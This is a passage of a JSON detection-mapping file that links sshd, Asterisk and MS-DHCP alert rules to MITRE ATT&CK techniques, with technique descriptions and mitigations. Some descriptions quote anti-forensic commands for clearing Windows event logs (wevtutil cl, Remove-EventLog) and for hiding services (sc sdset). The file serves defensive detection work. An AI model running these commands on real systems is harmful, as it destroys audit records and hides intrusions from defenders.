            "Limit which user accounts are allowed to login via SSH."
        ]
    },
    {
        "rule_id": 5712,
        "rule_description": "sshd: brute force trying to get access to the system. Non existent user.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 5714,
        "rule_description": "sshd: SSH CRC-32 Compensation attack",
        "mitre_id": [
            "T1210"
        ],
        "possible_attacks": [
            "Exploitation of Remote Services"
        ],
        "description": [
            "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery]( or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation]( as a result of lateral movement exploitation as well."
        ],
        "mitigation_strategies": [
            "Regularly scan the internal network for available services to identify new and potentially vulnerable services."
        ]
    },
    {
        "rule_id": 5716,
        "rule_description": "sshd: authentication failed.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 5718,
        "rule_description": "sshd: Attempt to login using a denied user.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 5719,
        "rule_description": "sshd: Multiple access attempts using a denied user.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 5720,
        "rule_description": "sshd: Multiple authentication failures.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 5731,
        "rule_description": "sshd: SSH Scanning.",
        "mitre_id": [
            "T1046"
        ],
        "possible_attacks": [
            "Network Service Discovery"
        ],
        "description": [
            "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service."
        ],
        "mitigation_strategies": [
            "Ensure proper network segmentation is followed to protect critical servers and devices."
        ]
    },
    {
        "rule_id": 5758,
        "rule_description": "Maximum authentication attempts exceeded.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 5760,
        "rule_description": "sshd: authentication failed.",
        "mitre_id": [
            "T1110.001",
            "T1021.004"
        ],
        "possible_attacks": [
            "Password Guessing",
            "SSH"
        ],
        "description": [
            "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
            "Adversaries may use [Valid Accounts]( to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user."
        ],
        "mitigation_strategies": [
            "Upgrade management services to the latest supported and compatible version.  Specifically, any version providing increased password complexity or policy enforcement preventing default or weak passwords. ",
            "Limit which user accounts are allowed to login via SSH."
        ]
    },
    {
        "rule_id": 5763,
        "rule_description": "sshd: brute force trying to get access to the system. Authentication failed.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 6250,
        "rule_description": "Asterisk: Multiple failed logins (user enumeration in process).",
        "mitre_id": [
            "T1133"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 6251,
        "rule_description": "Asterisk: Multiple failed logins.",
        "mitre_id": [
            "T1110",
            "T1133"
        ],
        "possible_attacks": [
            "Brute Force",
            "External Remote Services"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access.",
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.",
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 6252,
        "rule_description": "Asterisk: Extension enumeration.",
        "mitre_id": [
            "T1133"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 6254,
        "rule_description": "Asterisk: Extension IAX Enumeration.",
        "mitre_id": [
            "T1133"
        ],
        "possible_attacks": [
            "External Remote Services"
        ],
        "description": [
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 6257,
        "rule_description": "Asterisk: Multiple failed logins.",
        "mitre_id": [
            "T1110",
            "T1133"
        ],
        "possible_attacks": [
            "Brute Force",
            "External Remote Services"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access.",
            "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management]( and [VNC]( can also be used externally.\n\nAccess to [Valid Accounts]( to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts.",
            "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
        ]
    },
    {
        "rule_id": 6301,
        "rule_description": "MS-DHCP: The log was started.",
        "mitre_id": [
            "T1543.003"
        ],
        "possible_attacks": [
            "Windows Service"
        ],
        "description": [
            "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API]( functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry]( or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as [Rootkit]( to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service]( (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts]( for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. "
        ]
    },
    {
        "rule_id": 6302,
        "rule_description": "MS-DHCP: The log was stopped.",
        "mitre_id": [
            "T1070.001",
            "T1543.003"
        ],
        "possible_attacks": [
            "Clear Windows Event Logs",
            "Windows Service"
        ],
        "description": [
            "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell]( For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
            "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API]( functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry]( or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as [Rootkit]( to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service]( (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts]( for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`."
        ],
        "mitigation_strategies": [
            "Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities.",
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. "
        ]
    },
    {
        "rule_id": 6303,
        "rule_description": "MS-DHCP: The log was temporarily paused due to low disk space.",
        "mitre_id": [
            "T1489"
        ],
        "possible_attacks": [
            "Service Stop"
        ],
        "description": [
            "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible. In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction]( or [Data Encrypted for Impact]( on the data stores of services like Exchange and SQL Server."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."
        ]
    },
    {
        "rule_id": 6308,
        "rule_description": "MS-DHCP: A lease request could not be satisfied because the scope's address pool was exhausted.",
        "mitre_id": [
            "T1489"
        ],
        "possible_attacks": [
            "Service Stop"
        ],
        "description": [
            "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible. In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction]( or [Data Encrypted for Impact]( on the data stores of services like Exchange and SQL Server."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."
        ]
    },
    {
        "rule_id": 6316,
        "rule_description": "MS-DHCP: IP address cleanup operation has began.",
        "mitre_id": [
            "T1070"
        ],
        "possible_attacks": [
            "Indicator Removal"
        ],
        "description": [
            "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred."
        ],
        "mitigation_strategies": [
            "Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities."
        ]
    },
    {
        "rule_id": 6323,
        "rule_description": "MS-DHCP: Packet dropped due to NAP policy.",
        "mitre_id": [
            "T1595"
        ],
        "possible_attacks": [
            "Active Scanning"
        ],
        "description": [
            "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.\n\nAdversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains]( or [Search Open Technical Databases]( establishing operational resources (ex: [Develop Capabilities]( or [Obtain Capabilities]( and/or initial access (ex: [External Remote Services]( or [Exploit Public-Facing Application]("
        ],
        "mitigation_strategies": [
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
        ]
    },
    {
        "rule_id": 6321,
        "rule_description": "MS-DHCP: Codes above 50 are used for Rogue Server Detection information.",
        "mitre_id": [
            "T1557.002"
        ],
        "possible_attacks": [
            "ARP Cache Poisoning"
        ],
        "description": [
            "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing]( or [Transmitted Data Manipulation](\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address. Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.\n"
        ],
        "mitigation_strategies": [
            "Train users to be suspicious about certificate errors. Adversaries may use their own certificates in an attempt to intercept HTTPS traffic. Certificate errors may arise when the application\u2019s certificate does not match the one expected by the host."
        ]
    },
    {
        "rule_id": 6360,
        "rule_description": "MS-DHCP: Scope Full.",
        "mitre_id": [
            "T1498.001"
        ],
        "possible_attacks": [
            "Direct Network Flood"
        ],
        "description": [
            "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood]( are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks."
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 6361,
        "rule_description": "MS-DHCP: Started.",
        "mitre_id": [
            "T1543.003"
        ],
        "possible_attacks": [
            "Windows Service"
        ],
        "description": [
            "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API]( functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry]( or by using command-line utilities such as `PnPUtil.exe`. Adversaries may leverage these drivers as [Rootkit]( to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service]( (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts]( for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. "
        ]
    },
    {
        "rule_id": 6362,
        "rule_description": "MS-DHCP: Stopped.",
        "mitre_id": [
            "T1489"
        ],
        "possible_attacks": [
            "Service Stop"
        ],
        "description": [
